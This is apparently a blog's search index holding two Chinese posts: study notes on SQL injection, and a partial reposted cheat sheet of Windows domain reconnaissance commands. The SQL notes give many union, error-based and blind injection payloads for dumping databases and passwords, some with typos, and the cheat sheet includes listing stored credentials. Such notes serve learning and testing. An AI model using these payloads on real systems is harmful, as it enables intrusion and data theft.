<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/posts/0/"/>
      <url>/posts/0/</url>
      
        <content type="html"><![CDATA[<hr><p>title:sql注入<br>tags:sql注入<br>date:2021-12-20 20:20:20</p><hr><h1 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h1><h2 id="引发注入的原因"><a href="#引发注入的原因" class="headerlink" title="引发注入的原因"></a>引发注入的原因</h2><p>注入的产生原因通常表现在以下几方面：</p><p>①不当的类型处理；</p><p>②不安全的数据库配置；</p><p>③不合理的查询集处理；</p><p>④不当的错误处理；</p><p>⑤转义字符处理不合适；</p><p>⑥多个提交处理不当</p><p>注入点根据不同维度可分为：</p><h2 id="注入的类型"><a href="#注入的类型" class="headerlink" title="注入的类型"></a>注入的类型</h2><p>1.根据请求方式分类：</p><ul><li><p>GET 方式请求注入</p></li><li><p>POST方式请求注入</p></li></ul><p>2.根据注入点参数分类</p><ul><li><p>整数型注入</p><p>select uname,password from users where uid=$id</p></li><li><p>字符型注入</p><p>select uname,password from users where uid=’$id’</p></li><li><p>搜索型注入</p><p>select uname,password from users where uname like ‘%a%’</p></li></ul><p>3.根据SQL注入点反馈类型分类（重点）</p><ul><li><p>union类型</p></li><li><p>基于错误显示</p></li><li><p>布尔类型</p></li><li><p>基于时间</p></li><li><p>其他类型</p></li></ul><p>4.根据Web应用的数据库类型分类（数据库样式扩充）</p><ul><li><p>MySQL</p></li><li><p>SQL Server</p></li><li><p>Oracle</p></li><li><p>Acces</p></li></ul><h2 id="注入的流程"><a href="#注入的流程" class="headerlink" title="注入的流程"></a>注入的流程</h2><p>1、判断是否有注入漏洞，识别注入点类型</p><p>2、获取数据库中的信息</p><ul><li>获取数据库基本信息（数据库版本、数据库类型、查寻列数等）</li><li>获取数据库名</li><li>获取表名</li><li>获取列名</li><li>获取数据</li></ul><h1 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h1><h2 id="第一步判断注入点"><a href="#第一步判断注入点" class="headerlink" title="第一步判断注入点"></a>第一步判断注入点</h2><ul><li>判断是否存在注入，判断注入点类型：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #（整型）</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> #（整型）</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>’ <span class="keyword">or</span> ‘<span class="number">1</span>’<span class="operator">=</span>‘<span class="number">1</span>（字符型）</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>’ <span class="keyword">or</span> ‘<span class="number">1</span>’<span class="operator">=</span>‘<span class="number">2</span>（字符型）</span><br></pre></td></tr></table></figure><p>#表示：如果用户可控的传值位置不在末尾，那么#以后的sql语句会注释掉，不进行编译</p><p>and表示：and两边都为真时，那么结果为真，返回正确结果，反之返回false</p><p>or表示：or两边只要有一边为真，那么结果为真，返回正确结果，反之返回false</p><h2 id="第二步判断列数"><a href="#第二步判断列数" class="headerlink" title="第二步判断列数"></a>第二步判断列数</h2><ul><li>获取数据库中信息：判断列</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>\#</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>’ <span class="keyword">order</span> <span class="keyword">by</span> n\#</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>’ <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> n \#</span><br></pre></td></tr></table></figure><h2 id="第三步判断回显位"><a href="#第三步判断回显位" class="headerlink" title="第三步判断回显位"></a>第三步判断回显位</h2><ul><li>获取数据库中信息：判断数据显</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">union</span> select1，<span class="number">2</span>#</span><br></pre></td></tr></table></figure><p>备注：这里使用-1或者一个不错在的数,使union之前的语句查询无结果，则显示的时候就会显示union之后的第二条语句</p><h2 id="第四步获取数据库中信息"><a href="#第四步获取数据库中信息" class="headerlink" title="第四步获取数据库中信息"></a>第四步获取数据库中信息</h2><ul><li>获取数据库中信息：用户、版本、数据库名等</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> version(), <span class="keyword">user</span>()#</span><br><span class="line"></span><br><span class="line"><span class="keyword">User</span>()  #返回当前数据库用户</span><br><span class="line"></span><br><span class="line">Version()  #返回当前数据库版本</span><br><span class="line"></span><br><span class="line">Database()  #返回当前数据库名</span><br></pre></td></tr></table></figure><ul><li>获取数据库中信息：查看数据  (<strong>information_schema</strong>库)</li></ul><p><strong>SCHEMATA</strong>   </p><p>当前MySQL中所有数据库信息。SHOW DATABASES 命令:命令从这个表获取数据。</p><p><strong>TABLES</strong>      </p><p>存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。SHOW TABLES FORM XX 命令：从这个表获取结果。</p><p><strong>COLUMNS</strong>   </p><p> 存储表中的列信息，包括表有多少列、每个列的类型等。SHOW COLUMNS FROM schemaname.tablename 命令：从这个表获取结果</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> <span class="keyword">table</span> schema <span class="operator">=</span> ‘dvwa ’#</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> <span class="keyword">table</span> schema <span class="operator">=</span> database()#</span><br></pre></td></tr></table></figure><h2 id="常用函数："><a href="#常用函数：" class="headerlink" title="常用函数："></a><strong>常用函数：</strong></h2><p>**Concat()**：将多个字符串链接成一个字符串</p><p>**Concat_ws()**和concat()一样：将多列 字符串链接成一个多个单列字符串，但可以指定分隔符</p><p><strong>Group_concat</strong>()：将多行结果连接成一组</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,concat_ws(&#x27;</span>_<span class="string">&#x27;,user,pass) from message.user #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="keyword">user</span>,<span class="string">&#x27;_&#x27;</span>,pass) <span class="keyword">from</span> message.user #</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$qsql</span> = <span class="string">&quot;select * from message where id =&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$qsql</span>,<span class="variable">$conn</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);  <span class="comment">//查询一条</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;   <span class="comment">//while 全输出了查询的所有条数,只要满足union 相同列出的查询.</span></span><br><span class="line">               <span class="comment">// Get values</span></span><br><span class="line">               <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">               <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br></pre></td></tr></table></figure><p>当只有一行输出的时候  可以用concat 或者 limit单行输出</p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="报错注入概"><a href="#报错注入概" class="headerlink" title="报错注入概"></a>报错注入概</h2><p>利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息</p><p>1.XPATH报错注入的使用条件是数据库版本符合条件</p><p>2.extractvalue()和updatexml()有<strong>32</strong>位回显长度限制,需要用count()函数显示查询数量,在配合limit一行一行查询.</p><h2 id="XPATH报错注入"><a href="#XPATH报错注入" class="headerlink" title="XPATH报错注入"></a>XPATH报错注入</h2><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(arg1,arg2)  <span class="operator">/</span><span class="operator">/</span>接受两个参数</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>arg1：XML文档，arg2：XPATH语句</span><br></pre></td></tr></table></figure><p>条件：mysql5.1及以上版本</p><p>标准payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">updatexml(arg1,arg2,arg3)   <span class="operator">/</span><span class="operator">/</span>接受三个参数</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>arg1为xml文档对象的名称；arg2为xpath格式的字符串；arg3为str格式替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure><p>条件：mysql5.1.5及以上版本</p><p>标准payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="xpath注入过程"><a href="#xpath注入过程" class="headerlink" title="xpath注入过程"></a>xpath注入过程</h3><p>1、查看数据库版本:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select version()),0x7e))</span></span><br></pre></td></tr></table></figure><p>2、查看数据库名字：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select database()),0x7e))</span></span><br></pre></td></tr></table></figure><p>3、查看数据库有多少个表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=database()),0x7e))</span></span><br></pre></td></tr></table></figure><p>4、查看数据库有哪些表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))</span></span><br></pre></td></tr></table></figure><p>5、查看表里面有哪些列名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select column_name information_schema.columns where table_schema=database() and table_name=&#x27;</span>表名<span class="string">&#x27;limit 0,1),0x7e))</span></span><br></pre></td></tr></table></figure><p>6、查看表里面的数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>‘ <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(列名)<span class="keyword">from</span> 数据库名.表名),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><ul><li><strong>30位回显字符限制可以用substr()函数分段截取显示</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> substr(concat(password),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> substr(group_concat(table_name,<span class="string">&#x27;_&#x27;</span>,column_name),<span class="number">7</span>,<span class="number">27</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>)) <span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><h2 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h2><ul><li><p>floor()报错注入准确地说应该是floor、count、group by冲突报错，count(*)、rand()、group by三者缺一不可</p></li><li><p>floor()函数的作用是返回小于等于该值的最大整数，只返回arg1整数部分，小数部分舍弃标准</p></li><li><p>条件：mysql5.0及以上版本</p></li></ul><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="keyword">user</span>(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)y)</span><br></pre></td></tr></table></figure><p>公式解析：</p><p>•floor()——取整数</p><p>•rand(0)<em>2——将取0到2的随机数</em></p><p>*•floor(rand()*2)——有两条记录就会报错</p><p>•floor (rand(0)*2)——记录需为3条以上，且3条以上必报错，返回的值是有规律的</p><p>•count(*)——用来统计结果，相当于刷新一次结果</p><p>•groupby——在对数据进行分组时会先看虚拟表中是否存在这个值，不存在就插入；存在的话count(*)加1，在使用groupby时floor(rand(0)*2)会被执行一次，若虚表不存在记录，插入虚表时会再执行一次</p><h2 id="其他报错注入"><a href="#其他报错注入" class="headerlink" title="其他报错注入"></a>其他报错注入</h2><h3 id="列名重复报错注入"><a href="#列名重复报错注入" class="headerlink" title="列名重复报错注入"></a>列名重复报错注入</h3><p>•条件：name_const()函数在低版本中可以支持5.0，但是在高版本5.1+中就不支持了<br>•说明：name_const(name,value)，当用来产生一个结果集合列时,name_const()促使该列使用给定名称<br>•标准Payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> NAME_CONST(version(),<span class="number">1</span>),NAME_CONST(version(),<span class="number">1</span>))a;</span><br></pre></td></tr></table></figure><h3 id="整形溢出报错注入"><a href="#整形溢出报错注入" class="headerlink" title="整形溢出报错注入"></a>整形溢出报错注入</h3><p>•条件：mysql5.5.5及以上版本</p><p>•说明：exp是以e为底的指数函数，由于数字太大会产生溢出。该函数会在参数大于709时溢出，产生报错</p><p>•标准Payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</span><br></pre></td></tr></table></figure><h3 id="几何函数报错注入"><a href="#几何函数报错注入" class="headerlink" title="几何函数报错注入"></a>几何函数报错注入</h3><p>•条件：高版本MySQL无法得到数据</p><p>•相关函数：geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()</p><p>•说明：函数对参数要求是形如(12,33,221)这样几何数据，如果不满足要求，则会报错</p><p>•标准Payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> version())a)b)c))</span><br></pre></td></tr></table></figure><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>第一步判断当前数据库表的数量</p><ul><li><strong>count(*)</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.schemata;  <span class="operator">/</span><span class="operator">/</span>判断数据库的数量</span><br></pre></td></tr></table></figure><p>第二步判断当前数据库每个表名的长度</p><ul><li><strong>length(*)</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> length(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>第三步爆当前数据库表的名字</p><ul><li><strong>substr(string,start,count)</strong></li></ul><p>string:字符串</p><p>start:截取的启始位置</p><p>count:每次截取字符的数量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><strong>ASCII()</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br></pre></td></tr></table></figure><p>第四步爆当前数据库的字段长度及字段名</p><p>爆长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure><p>爆字段长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> length(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>爆字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;i&#x27;</span>   <span class="operator">/</span><span class="operator">/</span>爆字母</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span>   <span class="operator">/</span>爆ASCII码</span><br></pre></td></tr></table></figure><p>第五步爆当前数据库表的内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span> <span class="operator">/</span><span class="operator">/</span>爆字母</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> <span class="operator">/</span><span class="operator">/</span>爆ASCII</span><br></pre></td></tr></table></figure><ul><li><strong>information_schema表名字段一把梭</strong></li></ul><p>1判断查询数据的数量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.182</span><span class="number">.182</span><span class="operator">/</span>admin<span class="operator">/</span>action.php?action<span class="operator">=</span>usermod<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">23</span><span class="string">&#x27; and (select length(group_concat(column_name,&#x27;</span>_<span class="string">&#x27;,table_name,&#x27;</span>_<span class="string">&#x27;,table_schema)) from information_schema.columns where table_schema=database())=359 %23</span></span><br></pre></td></tr></table></figure><p>2一把梭</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.182</span><span class="number">.182</span><span class="operator">/</span>admin<span class="operator">/</span>action.php?action<span class="operator">=</span>usermod<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">23</span><span class="string">&#x27; and substr((select group_concat(column_name,&#x27;</span>_<span class="string">&#x27;,table_name,&#x27;</span>_<span class="string">&#x27;,table_schema) from information_schema.columns where table_schema=database()),1,1) =&#x27;</span>i<span class="string">&#x27; %23</span></span><br></pre></td></tr></table></figure><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><ul><li><strong>sleep()</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">3</span>),<span class="string">&#x27;goodbye&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>benchmark()</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,benchmark(<span class="number">5000000</span>,md5(<span class="string">&#x27;abc&#x27;</span>)),<span class="string">&#x27;goodbye&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="盲注基本过程"><a href="#盲注基本过程" class="headerlink" title="盲注基本过程"></a>盲注基本过程</h2><p>1、获得数据库名的长度</p><p>and if((length(database())&gt;5),sleep(5),1)#</p><p>and if((length(database())=6),sleep(5),1)#</p><p>2、获得数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if((ascii(substr(database(),n,<span class="number">1</span>))<span class="operator">=</span>m),sleep(<span class="number">5</span>),<span class="number">1</span>)#通过改变n和m依次获取数据库的字符</span><br></pre></td></tr></table></figure><p>3、获得数据库表名(先获取长度)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if((ascii(substr((<span class="keyword">select</span> table_namefrom information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">&gt;</span><span class="number">100</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure><p>4、获取数据库列名(先获取长度)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if((ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">&gt;</span><span class="number">100</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure><p>5、获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if((ascii(substr(( <span class="keyword">select</span> 列名 <span class="keyword">from</span> 表名 limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">97</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/1/"/>
      <url>/posts/1/</url>
      
        <content type="html"><![CDATA[<p>转载自guokeya</p><p> <a href="https://guokeya.github.io/post/tFK-eJTet/">https://guokeya.github.io/post/tFK-eJTet/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">net view /domain:XXX</span><br><span class="line">查看XXX域中的机器列表</span><br><span class="line">net view /domain</span><br><span class="line">查看内网中有多少个域</span><br><span class="line">setspn -T jumbolab.com -Q */*</span><br><span class="line">快速寻找内网中注册的服务</span><br><span class="line">net user /domain</span><br><span class="line">查看域用户</span><br><span class="line">net group &quot;domain admins&quot; /domain</span><br><span class="line">查看域管</span><br><span class="line">net time /domain</span><br><span class="line">定位域控。也可以通过ipconfig /all。一般DNS就是域控</span><br><span class="line">nltest /domain_trusts</span><br><span class="line">列出域信任关系</span><br><span class="line">cmdkey /list</span><br><span class="line">远程连接凭据</span><br><span class="line">nslookup -type=ns 